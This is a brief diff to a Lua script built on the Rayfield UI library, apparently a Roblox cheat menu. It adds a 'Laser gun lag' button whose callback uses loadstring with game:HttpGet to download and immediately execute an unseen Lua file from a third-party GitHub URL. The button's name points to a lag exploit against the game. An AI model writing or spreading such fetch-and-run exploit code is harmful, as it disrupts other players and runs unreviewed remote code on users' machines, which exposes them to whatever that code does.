@@ -46,4 +46,15 @@ local Window = Rayfield:CreateWindow({
     end,
  })
 
+ local Section = Tab:CreateSection("Laser lag")
+ Section:Set("Section Example")
+ 
+ local Button = Tab:CreateButton({
+    Name = "Laser gun lag ",
+    Callback = function()
+             loadstring(game:HttpGet("https://raw.githubusercontent.com/p7reeessssssxxxx/idk/refs/heads/main/laserlag.lua"))()
+    end,
+ })
+
+
  Rayfield:LoadConfiguration()
